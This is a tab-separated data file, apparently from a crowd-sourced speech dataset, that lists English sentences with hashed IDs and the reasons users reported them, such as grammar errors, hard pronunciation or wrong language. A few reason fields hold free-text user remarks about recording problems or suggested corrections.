sentence	sentence_id	locale	reason
His son, Jacques was also a dramatist.	45ef13c2b6f9cfd588abe93f3179547097f992dd17e1fd2df358af67843b8448	en	grammar-or-spelling
Amokachi managed Nigerian club Nasarawa United and later Enyimba Aba.	46061a7a56c0dea055eb27f98eae2bc74785936cf8207f6742c3c119cc19c655	en	difficult-pronounce
Amokachi managed Nigerian club Nasarawa United and later Enyimba Aba.	46061a7a56c0dea055eb27f98eae2bc74785936cf8207f6742c3c119cc19c655	en	difficult-pronounce
But the CinC exercised no command or control over any naval forces.	45f4f43ed7e87624bcdd1c40eb6caa70f4f2b2101479cd3f7b6bdfd942d42fce	en	difficult-pronounce
Fares for these routes may be higher that standard bus fare.	45eb88611a4235eb1272c6dd9010795ac80e016a877021083f4a9cfcc4ba4a84	en	grammar-or-spelling
From there, the river passes through wilderness areas and well as the countryside.	45f44378a8868105d7fac93ff7e3f2379fb106f0910cf739b845e12a6f045dfa	en	grammar-or-spelling
Commonly lower tolerance limits of are cited for mature plants.	460acd2c48e6965ca3389f19e173d785e23b9e294749246afe32996526c88c9b	en	grammar-or-spelling
Main offices were located in downtown Denver and the Greenspoint area of Houston.	460790211e73609ce618f18fc902444a502704e55af7bb31ed800d319e21d898	en	different-language
Main offices were located in downtown Denver and the Greenspoint area of Houston.	460790211e73609ce618f18fc902444a502704e55af7bb31ed800d319e21d898	en	difficult-pronounce
Nathan Fouts, an ex-Insomniac employee, founded his own studio and developed "Weapon of Choice".	4619334e5f9513410936b0146132cd121fccdafdddcb9ee7bc62681f19d855be	en	difficult-pronounce
Once the temperature has stabilized the sample is inserted.	4656424ff96966e54270f9d4522baa434440141e09cfd2dd05b269e6d7a9bf75	en	different-language
Chris Webber predicted that they would not be as good under another coach.	463a303c3cf83abea511cffe32fbcbe603332c26912290f03456905f00245a07	en	offensive-language
Chris Webber predicted that they would not be as good under another coach.	463a303c3cf83abea511cffe32fbcbe603332c26912290f03456905f00245a07	en	grammar-or-spelling
Chris Webber predicted that they would not be as good under another coach.	463a303c3cf83abea511cffe32fbcbe603332c26912290f03456905f00245a07	en	different-language
Rychlak suffered no serious injuries from the accident.	467174301091b9b99646f77b003e987712427cf507ba2cdb51188348a001d7bd	en	different-language
Prince Bernard is a self-employed entrepreneur.	4659d5921424a5a8a18582bb3c55de7511eb593c11c0f89621e7b7b236ff351b	en	different-language
The Habsburg duke won the fight, while the king was killed in battle.	467ee0700d65832d4d3d954f9750482868d62585a383fcd8a00ce08fe375ce9c	en	different-language
West Manchester Township farmers and residents lost horses and mules to the Confederates.	464fa36ec3ec6feede6f2a3cccc513bbbfc84efe4c856c32d1288b09bc60390c	en	different-language
The town is presently the site of Bannack State Park.	464a1d0f85a7d0f1af4f1cb733fe135809239a4d23bdadc98d3a399e04130e66	en	different-language
The military chorus sings the Three Rules of Discipline and Eight Points for Attention.	464fdcd59103374cf10713b10584b0c18aa153071856580732447174f204a6a3	en	different-language
She later studied massage therapy and is employed as a respiratory therapist.	465a84f498036912d95d2a7b2772215aca50aea55adbb4a581facf6143c9e6e3	en	different-language
He is also known as Georgy Narbut and George Narbut.	465f2d9a1826757fd8add52b3c740d46bcb7e175f56c12a229bfd1dc73ced1bb	en	different-language
It was called Perrystown after Obadiah Perry, one of the proprietors.	460a780c5cbb8d5ea8ac024a8b3ff8692f26850b94982dfd81d9a6993f4c2b50	en	different-language
This standard uses 'bit' as the symbol for bit, as opposed to 'b'.	4665e33c2d10620596419fd2db07a780c03a79d97d2eb482d7a53da6ef7ec07d	en	different-language
Fliedner was born in Eppstein in the Hesse, Germany.	468bcdc77aec3f1b987b040e4da2a2cc7fd547a0eaeac4183a3d6a6fc1d1ca8b	en	grammar-or-spelling
Fliedner was born in Eppstein in the Hesse, Germany.	468bcdc77aec3f1b987b040e4da2a2cc7fd547a0eaeac4183a3d6a6fc1d1ca8b	en	in Hessen
The only know species is the shrub C.	46ac5c675cc04a775c95c7484bb588ff0041f623f40ed594771a618977c36f6a	en	grammar-or-spelling
The only know species is the shrub C.	46ac5c675cc04a775c95c7484bb588ff0041f623f40ed594771a618977c36f6a	en	known
Moving from there to Blackheath then Penarth.	46ab190deee030066b8933af12cc418605325f5be2c6a12c74bad567489da9e2	en	offensive-language
Moving from there to Blackheath then Penarth.	46ab190deee030066b8933af12cc418605325f5be2c6a12c74bad567489da9e2	en	grammar-or-spelling
Moving from there to Blackheath then Penarth.	46ab190deee030066b8933af12cc418605325f5be2c6a12c74bad567489da9e2	en	different-language
The shield represented the ancient ecclesiastical landowners of the area.	472f6f90b876b074e9568bc7dcb8c4fccc1ab0893bb6bda4e763be56bf3ae878	en	difficult-pronounce
His served as an aide and interpreter for several Presidents.	472191682baa74db42942e5e7df5df75ad78f8bf13c62fb171cd8c99b57c9ef8	en	grammar-or-spelling
"Scorzonera tau-saghyz" is a source of natural rubber.	475ab5d1fd05ba611d553b6f56383aa192554f1dbc4abc59c4cde4ea53f548a0	en	difficult-pronounce
Many infrastructure projects has been carried out including some five-star hotels and resorts.	47bbf19b74bd9b232b35d188b641513bc58ff9987b4e4cdac96b51a784242ec6	en	grammar-or-spelling
The was the Vietnamese Nationalist Party.	483116c96d98adbc8dbc7242b786ad992064c31da2ba9f329cc976df8f51b982	en	grammar-or-spelling
In Michigan Dept.	481e2ef8c7d1bfe5e70189ee50867d58864b0cefef9a56bb8974d80896031840	en	grammar-or-spelling
The city of Seminary is served Covington County School District.	48b8b65e0bad8f8a2bf627e17bb429d2f7ccc48d3dbacd043d2ce81d7102e45f	en	grammar-or-spelling
The city of Seminary is served Covington County School District.	48b8b65e0bad8f8a2bf627e17bb429d2f7ccc48d3dbacd043d2ce81d7102e45f	en	served by
During her trance, said kami had requested the girl to his shrine.	48e57caa428e34fc5212d87d43450f89e5602a073186c80ec2488057e3f58c17	en	grammar-or-spelling
He is buried in the burial ground attached to Capel Brynaerau, Pontllyfni.	485634fcdade4a5f41560720bc7f095f80c8867067662a9192da79c6ea3762d2	en	difficult-pronounce
The law granted judicial autonomy, thus creating to judicature of Itapetininga.	49045ba9bc1e937e3f1f48759183f9bedef5292b7c855f48034c216b63fb12aa	en	difficult-pronounce
Some are part of the Gardens of Western Manitoba seasonal self-guided tour.	490dd0bd25758341c35c8073d9a259d46b1dd4446a6d7039a2029c774f675c77	en	grammar-or-spelling
Though innovative, these products they were not always practical in use.	48f3aef9a8c41958385969c53d944dd928f205a65e099478e0586e2b808c4fb8	en	grammar-or-spelling
The Banao Itneg variety is not one of the neighboring Itneg languages.	48fd5aa53a5cef2b616d045ba17574cd581f343e15212416ef7b9600731bdcf8	en	difficult-pronounce
Since the haversine formula uses sines it avoids that problem.	4910edc426229fe9fdf9cb17e591e6d3017ca095296e427de9d618398876db92	en	difficult-pronounce
It is drained by the Merrimack River and Contoocook River.	49097a903cb0870e3a0c716e627ebeb156f631b50c2fde5d74be516e2d66a63c	en	Already recorded this sentence.
He is buried in the burial ground attached to Capel Brynaerau, Pontllyfni.	485634fcdade4a5f41560720bc7f095f80c8867067662a9192da79c6ea3762d2	en	difficult-pronounce
Today, the plaza is typically visited daily by tourists.	490bfe7fd388d377e6b5f661e8bd45c2289b61c3f8703230d84ab572f76c6ca1	en	grammar-or-spelling
The law granted judicial autonomy, thus creating to judicature of Itapetininga.	49045ba9bc1e937e3f1f48759183f9bedef5292b7c855f48034c216b63fb12aa	en	difficult-pronounce
There are frequent bus services are available for Devakottai.	48aaf286735374422c089729b572fbf076e4a38487460dd6bfb6d01d4f55bc01	en	grammar-or-spelling
Yeshiva Gedolah Zichron Moshe is a private rabbinical college located in South Fallsburg.	48dd9ec86fea778961d95d3996a20d302d606e3d6a935fded22bf9b95529237c	en	difficult-pronounce
Purushotam Doss renowned Philanthropists to establish an educational institution for higher education in Chennai.	489607ee109d42b1af1243c16b5d5c3c4da86897662b8622eb6c7b3376203f8b	en	grammar-or-spelling
Their main goal was to see a vision that would explain their future.	493249871131293c94253c22a31b2d6c7c89179fcb7b7f92e2f9103bcf7b0f80	en	Every time I try to Speak, It always says " It was so quit" 
why i am seeing this error and i am speaking as loud as i can speak

Checks:
Microphone permission given
allow the site cookies
sign in using mozilla account
Paul R. Wallace and Tpr.	49060d5842d992d7c3b58f1e05bb63a4b97670e1e98d39cabf96afe61b0a9d53	en	difficult-pronounce
Paul R. Wallace and Tpr.	49060d5842d992d7c3b58f1e05bb63a4b97670e1e98d39cabf96afe61b0a9d53	en	grammar-or-spelling
The Bobcats hired coach Larry Brown to be their head coach.	49802a041809ba585740b921e120187c42bd4610f34a06557772b90953c9c8c6	en	grammar-or-spelling
The Bobcats hired coach Larry Brown to be their head coach.	49802a041809ba585740b921e120187c42bd4610f34a06557772b90953c9c8c6	en	offensive-language
The Bobcats hired coach Larry Brown to be their head coach.	49802a041809ba585740b921e120187c42bd4610f34a06557772b90953c9c8c6	en	different-language
The Bobcats hired coach Larry Brown to be their head coach.	49802a041809ba585740b921e120187c42bd4610f34a06557772b90953c9c8c6	en	difficult-pronounce
Recipes with vin jaune may specify morels instead of white mushrooms.	496ebfd1ebcf405e3b88e759dbbf0b52f150c74f5097a9b63bacbdca70cdb953	en	different-language
Dialects of the Silt'e language include: Azernet-Berbere, Silti, Wuriro, Ulbareg and Wolane.	49716257cb0440dcd35481e8434c5c1118f3ca1cef8fd233ce959867831e82f9	en	difficult-pronounce
Some anapaestic verses in praise of Euripides are preserved in Gellius.	4938fe746945e6a485924d8a567292d3418ff3b00fa664ec8b072259bd492c82	en	difficult-pronounce
He was then elected the unit's colonel.	49cf4e153d93ee6c4aa3d214e23cce30b7708232d42ac5b8dd719927b6a9a910	en	offensive-language
He was then elected the unit's colonel.	49cf4e153d93ee6c4aa3d214e23cce30b7708232d42ac5b8dd719927b6a9a910	en	aasd
Unable to bear this information, Buffy retreats to the back porch in tears.	49e2d4e033f5fc98ea2b266f46b06c7883ef04ddfccb7cdb4a2b8443942dfa6b	en	Hi l have to re-inject air into my throat or others say stomage to make a sound  that I  have to articulate to form the words
Customers were planned to be migrated over a six to eight months period.	49e53ac423ef9ff37c6627bd30893647abd597d69bb2b6a6dd2407b99215f5b4	en	grammar-or-spelling
Customers were planned to be migrated over a six to eight months period.	49e53ac423ef9ff37c6627bd30893647abd597d69bb2b6a6dd2407b99215f5b4	en	grammar-or-spelling
His other actiovities included being an adjudicator, an orchestral coach and a lecturer.	49a194ee67c5de6f61f411f2cd42a09b6d58ca988520b33f0b778255509ab9f6	en	grammar-or-spelling
Vaiko also supported national interlinking of rivers and Sethusamudram Shipping Canal Project.	49f7e627c3a9c4ba13f1c5d4ff5947f6e01677d0679680435d1fe51f8d9125a9	en	difficult-pronounce
His other actiovities included being an adjudicator, an orchestral coach and a lecturer.	49a194ee67c5de6f61f411f2cd42a09b6d58ca988520b33f0b778255509ab9f6	en	grammar-or-spelling
Matteo notably achieved control over Pavia, Vercelli, Novara and Como.	4a528f522e69c9efd54aab0ccc529f1c5e6b227e9607b29ada6816141c12aaba	en	different-language
He was also scientist who named the black widow.	4a626abea4d26425e5aaaa5624f7167872ba07e9ac52608029a8a4ddbed56646	en	grammar-or-spelling
The separation of plant beds of a pareterre is denominated an "alley of compartiment".	4a3549e0c585cb08e3df9e393eaa0749fe314c60664e033e8ae0e28c59b9e454	en	grammar-or-spelling
Meanwhile, Karen escapes prison with the help from a love-struck Swedish guard named Ole.	4a80627c5cf9ffc221b2163c194dc4f14cc7caf1823f4241bc3e2bbb877cd6b4	en	grammar-or-spelling
He was also scientist who named the black widow.	4a626abea4d26425e5aaaa5624f7167872ba07e9ac52608029a8a4ddbed56646	en	grammar-or-spelling
In India, Nepal and Pakistan, the "paisa" currently equals of a rupee.	4a803b6003aa3ea289e69f7c0a313b395ffd2dc3c94cb854dfe3cf96edc6f1ce	en	grammar-or-spelling
The show was filmed in north east Cheshire and Altrincham.	4a606e361463fb55d6656aa90a2f8da6b23c67a09586c72ba8dabe84baa45df2	en	difficult-pronounce
The East Branch of the Tioughnioga River passes through the town.	4a6e26fffeacd064f1b829d4d6ddb57092388fd654809a6cdd4c03350780b885	en	difficult-pronounce
Earthworks cost is a function of hauled amount x hauled distance.	4ac980f0ee6002ebf679f122afa77f09aea35bc658304772d846ad880657d5a3	en	The sentence abbreviates the word "times" (e.g. distance times force) as "x".
This generally served with different types of vegetables, potatoes and salads.	4a9b3f87d759cccd52840c2f234792825385bef46bee0a1fa618fa9f0618b236	en	grammar-or-spelling
He was a instrumental in filing cases in the construction of flyovers case.	4ae3b47c1bfecff3ad54836d3edababd1104010a15286860060439e6556dde4f	en	grammar-or-spelling
It has also access to the Berlin-Halle railway line.	4afebcb198a83d2d33914332b5a6589a37c7e4e2161d35a402a795384565753c	en	grammar-or-spelling
Amongst other he teamed up with was Ignazio Giunti and Nino Vaccarella.	4b3c6b0a61090eba5d9d24d2f0f04286a3e9f040725d36760a3d79656dc76a96	en	grammar-or-spelling
This led to increase in both of enrollment and academic faculties.	4b46537d726b1fec41e6e262b217bdcc58904c30df5da69811ab959c72d2b7a0	en	grammar-or-spelling
The split between the parties is said to have been mutual.	4af6e31fd596dada28e41f5deaae6851428306935d18ff4eadb83db1cec3d7af	en	different-language
A scientist travels in the ship as a passenger.	4b3c7d8b77a51176a2e2ca6195b6297c076b551f119968953b528186e43066ba	en	difficult-pronounce
A scientist travels in the ship as a passenger.	4b3c7d8b77a51176a2e2ca6195b6297c076b551f119968953b528186e43066ba	en	grammar-or-spelling
In the mid-nineteenth century, coalmining began at Barlin and the town flourished.	4b5b7081b7bb2004570ad1dc2c7fd6f4371e5e1c53e9dc9c1af3aa1382ae68df	en	difficult-pronounce
He named a solanaceous genus, "Scopolia", the source of scopolamine, after him.	4b157b44d948ee197bb24d571a254a2778c02f97e85535893ed162fcc7b5ffac	en	different-language
The Epcos factory produces ferits for automotive purposes.	4b49dc83ee4baa768c9bc98294431984e072c67fc9c092ee86a79eb563df3052	en	grammar-or-spelling
With those safety feature the risk of accident in not higher.	4b9f981a0212a0f03f7f4c33e1ea88100b1a9bcece9d9a04dd4be6879df189fb	en	grammar-or-spelling
The death of Carrero Blanco had numerous political implication.	4bae4c7ff2b9d1b42ce136b94ec7619bb53ff61ab991ca705c9e3591215bc65b	en	grammar-or-spelling
It is where the social phenomena is developed and theorized.	4b8b80be2e02c93fb500be7bc5125126df2e37951850a36f5ed130830f8e85f0	en	grammar-or-spelling
With those safety feature the risk of accident in not higher.	4b9f981a0212a0f03f7f4c33e1ea88100b1a9bcece9d9a04dd4be6879df189fb	en	grammar-or-spelling
It has also opened schools for under graduate programs and offering degrees.	4b8a247bedfad28cef5ced3a0f3b8a3f55aa399e6c9c6d181e8426740080d3ea	en	grammar-or-spelling
Bundesliga who have not just been promoted.	4b6c226ec2695030af263e35c5284d295e04a93da2e1a9a048c8d86df6cbc7bc	en	grammar-or-spelling
Her Titan father is called "Coeus," and though H. J.	4ba484ac72c0b6c6bda32d0ead1e74ee69de27cd1a5f4da3b13f1261117b1966	en	grammar-or-spelling
Paddle wheels were on the sides and it had two cranks for propulsion windlass.	4b9ef0311b11039ad3a94282165fa3d58062f7d4efb55a91d863bcd228d50f1e	en	grammar-or-spelling
In that stadium, the retractable-roof also opens lengthwise from the center to the touchlines.	4bb25fdd2c55067e94fe12328545085af7583f1491477670ffbbbdc67c0e32f2	en	grammar-or-spelling
Male are usually more docile.	4b8804a6a87a76247e33e44d8981e5d9fb4d9210f76d60db8ad8c0f19875cdd1	en	grammar-or-spelling
In that stadium, the retractable-roof also opens lengthwise from the center to the touchlines.	4bb25fdd2c55067e94fe12328545085af7583f1491477670ffbbbdc67c0e32f2	en	grammar-or-spelling
The premium also is affected by prevailing demand.	4baf882616c94a30a8091a33f3679cfe6bb35a1e6bf865e28747c58cd0c2f398	en	grammar-or-spelling
Blue Mountains Leisure Centres operate from five locations.	4bf056d14fe690103603a384441a4d8d0cf7cb9a640b87e0f580d5074cc62c83	en	grammar-or-spelling
Reach, both rival sporting goods companies.	4c0d111f336980017cb0d0e9d23aa56500a55e72bde61e10d11f656856a4dfc0	en	grammar-or-spelling
Its circulation is worldwide consisting mostly ex-pats.	4c00ff3c73c5bef20777afd00508322a1215655111a1249511be6acd43cf2472	en	grammar-or-spelling
Taylor denied this and said that the song had nothing to do with Skellern.	4be5009dc4e3720cb8443384d80fa331a3139f5216deb2ef95551ebe9b62c3c3	en	grammar-or-spelling
The athletic field was laid out and many curricular activities were started.	4bfc6cbf89d75e57b0f0c8a6e763cadf4247d38e67166f744f06591077fc0df8	en	grammar-or-spelling
Thus, what may seem like Appeal to novelty isn't a fallacy in every case.	4bd3e7188b96fe16c16225229e809bcf6e98c2a364056fd062b2db21762331c0	en	grammar-or-spelling
Thus, what may seem like Appeal to novelty isn't a fallacy in every case.	4bd3e7188b96fe16c16225229e809bcf6e98c2a364056fd062b2db21762331c0	en	difficult-pronounce
The blasted Liberty for selecting the most intrusive means possible to achieve its goal.	4c14a93912af0f73a79bc0094a0b7501e0f2685f0fb28fb072c3199ceec8ebc0	en	different-language
The blasted Liberty for selecting the most intrusive means possible to achieve its goal.	4c14a93912af0f73a79bc0094a0b7501e0f2685f0fb28fb072c3199ceec8ebc0	en	difficult-pronounce
The judgement expanded the applicability of thesawalamai by settling the following points.	4be2f4d2d47961d9d99c1ad3c7ce37b101c5d44b1255c6c75a51d72a8b73f9ca	en	difficult-pronounce
Her sisters Sula and Lara are also in the music business.	4c1d7c67e7d514faf844ba15c19eb1c480bd1d1dcbe278845687cdd9eae0bfad	en	difficult-pronounce
Her sisters Sula and Lara are also in the music business.	4c1d7c67e7d514faf844ba15c19eb1c480bd1d1dcbe278845687cdd9eae0bfad	en	offensive-language
In this village was born in Lithuania singer, composer Mikas Petrauskas.	4c2497636562400924aced7b72651d2afd11ae0492b7c552d75a15dffd1c1473	en	grammar-or-spelling
Bobby Anderson, formerly of the band River City High, became Tell remplacement.	4c3b68532e9e33a1de8d4b9e07c03bfedf6dc9aadfbd171a69c27842908f0331	en	grammar-or-spelling
Cnut was "ealles Engla landes cyning"-"king of all England".	4c4bb790b21aaa0656ac58843a1487b80af0f39f8655abe69bbb12b176e15837	en	difficult-pronounce
"Christiania" was later changed to "Kristiania".	4c3cae8820fd6ea5160ffd4ed47897fe97ddc63f58163a79f6a0b826e4d111c2	en	

The shift from warm to cool climate might have already starte.	4c429d4054dcb9b89c3b26de09cc0bcc5ba24ff9e5a9f737e1468a7831acfcd9	en	grammar-or-spelling
The image formed on the water will then be interpreted by the "albularyo".	4c3f0658c9eebf49500dbcc5f93735dac09e16b0fcb41e26f603e451e54b3e73	en	difficult-pronounce
The dance then spread across America and to Paris and Prague.	4c73792ff49adec309b777cf56ab2aa9d1122acbf42a1d271f2903697e7151ee	en	grammar-or-spelling
The Wearside League is fed by the Durham Alliance Combination League.	4c7b6267827e7e7faccedec654aadff366142eda5698b32c90a41112da845d93	en	different-language
When Gan Ning's troops reached Yiling, Xi Su surrendered without a fight.	4c9da946e7ea3be76e80d9eff6049c97cd21bdf0d45e471eb7f3635506ce9ccd	en	difficult-pronounce
It sometimes erroneously known as Stohrs Cross Roads or Stohrs Crossroads.	4c9a79c4be4a085c3eb604a6b892a807020604e0faa4d72ea9dd9833cfe7f5d9	en	grammar-or-spelling
The series has a total of seventy-nine episodes and eighteen shorts.	4d5f698f17f0bb988442617cc4ed04b81e7320895c93925542177f6e1f55a778	en	different-language
The series has a total of seventy-nine episodes and eighteen shorts.	4d5f698f17f0bb988442617cc4ed04b81e7320895c93925542177f6e1f55a778	en	?*?ok sound impak  

The design has been further developed as the for the Russian Navy.	4d4b36cb21817702de6767a6d13d61ab454cf730a9d6d648be922e05735cd715	en	grammar-or-spelling
Image stabilized binoculars are designed to minimize image shaking in hand-held binoculars.	4d4f617fbfc94975edaeda4d7c4a9ba353903fc733ccfd4ff9eca7bcabd9b335	en	difficult-pronounce
Eventually Giles makes it back to Sunnydale.	4d622c722edf98aa56e10c19cb45cfe5aba7c960cebf1826d449ba96ed58920c	en	grammar-or-spelling
During its time at Ebbw Junction, the steam heating boiler was isolated.	4d811aad85ff96557f447c1d9c08c01af02a236dde19ee84303e019b094bbdda	en	grammar-or-spelling
Urban change has been rapid, with considerable commercial developmen.	4df3d41f6ca7ae8e92e88d449ce1861609585e4266eaf673ee915106cadc45ab	en	grammar-or-spelling
Semprini with Rhythm Acc.	4deb511928ee5248757a1ac2f1ca710b94f0a7c24edcb7fdd743ec9f931efea9	en	grammar-or-spelling
Pop 'Im Pop!	4e001e7eea47ee2dc1d1653d56fd90141bfbe4f195dc42c09907911d367249ea	en	grammar-or-spelling
Pop 'Im Pop!	4e001e7eea47ee2dc1d1653d56fd90141bfbe4f195dc42c09907911d367249ea	en	difficult-pronounce
Other productions are staged in the drama studio is a smaller space.	4e4e61f905d0acaff6118bf732cf4b81adeb691eba61583a9f798c60bd395251	en	grammar-or-spelling
The students are required to wear uniforms for gym.	4e5f32021e701c8f59e88bfa39656b98723e006c0f0e10185072163cba47ba90	en	no sound when I  listening to my previous recordings, not sure if this is a mic or playback issues (FF 68.7)
They typically lacks most or all of the effects that interest musicians.	4e57ed3520c8b3fb229bef91d7dcc5bce918ed97c205d9482218b84c538686c5	en	grammar-or-spelling
This also makes more space available for intensive crop production.	4ea1eb7ff64b74ce523ac64489ff3772d43005f96e9a8225a9982bcc3f8e3979	en	not recording

About of irrigation water is needed for every one kilogram of sugar produced.	4e7d8b0fc286e51c435939093430352745e788e7c086302a98248d3f9169aa35	en	grammar-or-spelling
The comptroller is not term-limited.	4ee3524d6b6a2fd8c2f160f855990f85398b86c14cf1f4fea6066c8cbcd20cb7	en	grammar-or-spelling
The film was given a favorable review by Wild West Magazine.	4ee436d0324ae0efebdb799dbf26146cf5802975b8c0dae87c1b97ce0d3379aa	en	different-language
The film was given a favorable review by Wild West Magazine.	4ee436d0324ae0efebdb799dbf26146cf5802975b8c0dae87c1b97ce0d3379aa	en	grammar-or-spelling
The film was given a favorable review by Wild West Magazine.	4ee436d0324ae0efebdb799dbf26146cf5802975b8c0dae87c1b97ce0d3379aa	en	offensive-language
The film was given a favorable review by Wild West Magazine.	4ee436d0324ae0efebdb799dbf26146cf5802975b8c0dae87c1b97ce0d3379aa	en	difficult-pronounce
After subsequent proton exchange, water is cleaved from the iminium ion intermediate.	4f2986cbc457f6c3d1be8cd6913de5426a689e20c14f03213a6e463ea7bf2ddf	en	grammar-or-spelling
"Eu estou a trabalhar".	4f2687317a963189b7bac771e308fe75621312f9802fd9394316a3733ec1afe8	en	different-language
"Eu estou a trabalhar".	4f2687317a963189b7bac771e308fe75621312f9802fd9394316a3733ec1afe8	en	different-language
"Eu estou a trabalhar".	4f2687317a963189b7bac771e308fe75621312f9802fd9394316a3733ec1afe8	en	different-language
Exercise enhances walking speed, allowing for safer and more functional ambulation capabilities.	4fb0e21dbe24cd7d560a5dc1573688fb0c1afb2ee12ef8699c673a2b5464f433	en	different-language
Exercise enhances walking speed, allowing for safer and more functional ambulation capabilities.	4fb0e21dbe24cd7d560a5dc1573688fb0c1afb2ee12ef8699c673a2b5464f433	en	 (-*+ N?;o?u?t?p?o?r?t?.s?o?u?n?d? r?u?n? 1r?o?l? 1)
m?o?z?i?l?l?a?.o?r?g?
a?s?w?a?d?i?r?u?


Pacific Palisades Conservation Area is a tract between Saint Louis and Jefferson counties.	5016715c192462ab9360360eb0b1fca3b96603da2bb3e02e743c271d5c673fb0	en	When I seem to say negative words about like Google or other groups that belong to the dark side I won't submit my my rating nice when I spoke but if I say no negative stuff about United States Jesus sending my clips before I even get to finish the senten
Temperatures frequently exceed and occasionally during the summer months.	505e0c004accc0c07fdcc8f6f70e88ae974b6a21852518af8928aaf99ebddd8e	en	grammar-or-spelling
The party also is governs the Balochistan and Punjab provinces.	50767a0557cb76cf4c9cea0b27d84459e65d72670d49f57d9973abb160a55947	en	grammar-or-spelling
The gluteus maximus is the largest and most superficial of the three gluteal muscles.	508fcf0239edc9a02cf0d6843af4265072b2f615a722bbb40a77e55179f8c66e	en	offensive-language
He is the third god in a triad with Khaldi and Theispas.	50d1542a7e65562156d128c4acedd6a84f08436ab4d924cf978c85477e73ab19	en	difficult-pronounce
He was born on the isle of Chios, where he originally was a merchant.	50cce160e6ca2159743272cc46f03efc0a049b7ab27c5e2c69cab8681031da72	en	difficult-pronounce
Del Dettmar commented The mix is too toppy.	50c64163e2127affc0f51402c3c57de7f98b8a84f439e6717acecb6fa2308851	en	grammar-or-spelling
Del Dettmar commented The mix is too toppy.	50c64163e2127affc0f51402c3c57de7f98b8a84f439e6717acecb6fa2308851	en	difficult-pronounce
Kaltag was a Koyokon Athabascan area used as a cemetery for surrounding villages.	508b3cbf7a36ef67a034ab76094b92b205fd3f6843996768f754bff5d69242ef	en	difficult-pronounce
He is the third god in a triad with Khaldi and Theispas.	50d1542a7e65562156d128c4acedd6a84f08436ab4d924cf978c85477e73ab19	en	difficult-pronounce
Apponequet has five choral groups.	50cf63cd5a4276f45cccca22e5312efea6798fc8c6e39a193ecad30f74f6cf70	en	difficult-pronounce
Nitrogenase is inactivated by oxygen, so the heterocyst must create a microanaerobic environment.	50c8c72a63c0422323dac47fe459e75b8df730325a2fefb711c5ca35c0d01574	en	difficult-pronounce
The Progressive Youth Organization was a Maoist organization in Afghanistan.	50cd00e2800447019f2a3f64e5bc762f531a118bb082e81e2811a38f4beeb937	en	difficult-pronounce
Lipscomb was born in Cleveland, Ohio.	50be0b89ffa5e1f60b524178b3d2686517e373ef58e9fdbe39ce5afb52410974	en	difficult-pronounce
Cavansite is a distinctive mineral.	50b4bfac9f859aaf53802fc6b69207918de836990afa232fbe41f7bc7ebd4a3d	en	difficult-pronounce
At the bell, he passed one of the two then-leaders, American John Eisele.	50cb2a6003b832b899198364f7d87ea731073890ca20965a4d73871918ece7e4	en	difficult-pronounce
In the past Rovereto was an important centre for the manufacture of silk fabrics.	50cc1886c20b057bd3c6e6342715dbbab64ebc3403ea231f181ec2d59d0b96e2	en	difficult-pronounce
The findings are evidence of Mediana being a highly Christian community.	50b3911b76bd654a513f138438c0b61f95ba3193c70cbc602c9b7d80d6c0e589	en	difficult-pronounce
Talysh, Ossetian, and Kurdish.	50a5d221e87717c5b33690ab7baf068ff51ee0614a60f22e873d4c26f5ad3a8a	en	difficult-pronounce
It is also twinned with Saint Joseph's Agricultural School In Blama, Sierra Leone.	50ce8ab50d2aaee39e69a24a993377c4d87922fc724240b14b692cae4094a180	en	difficult-pronounce
'Van Houttei' reaches in height.	508e71f05ba3612f998d915a571de972377cab783f6de9f886b0ebf65a0db570	en	difficult-pronounce
It was designed by British architects, Sir Edwin Lutyens and Sir Herbert Baker.	509211ac344b4ce456c4b6ddf6ec7341b6c92e35381a658183deeb8646e88392	en	difficult-pronounce
East Mississippi Community College offers some courses at Noxubee County High School in Macon.	50d521303ecfa0a1d78e06471afc1726cbe13f6f1a267351e9df726bb96c96c9	en	difficult-pronounce
Its inhabitants kept the old timeline beginning with founding of "old" Crobuzon.	50cf2343f959e4135442765df8875ab7a804d7f8fe15438d5fc32e56b3f5427b	en	difficult-pronounce
Montigny has become a haven for Saint Quentinois wishing to settle there.	509c5d3a1a46372e3622556276ce1e53d5248791ab542f5d00374445620e80a5	en	difficult-pronounce
Flint bracelets were known in Ancient Egypt and several examples have been found.	50e106358d1cb616d5beb63ab6d7f2816ae40ecf1844c0fbd9a8eedf0ed7afce	en	offensive-language
Flint bracelets were known in Ancient Egypt and several examples have been found.	50e106358d1cb616d5beb63ab6d7f2816ae40ecf1844c0fbd9a8eedf0ed7afce	en	grammar-or-spelling
Flint bracelets were known in Ancient Egypt and several examples have been found.	50e106358d1cb616d5beb63ab6d7f2816ae40ecf1844c0fbd9a8eedf0ed7afce	en	different-language
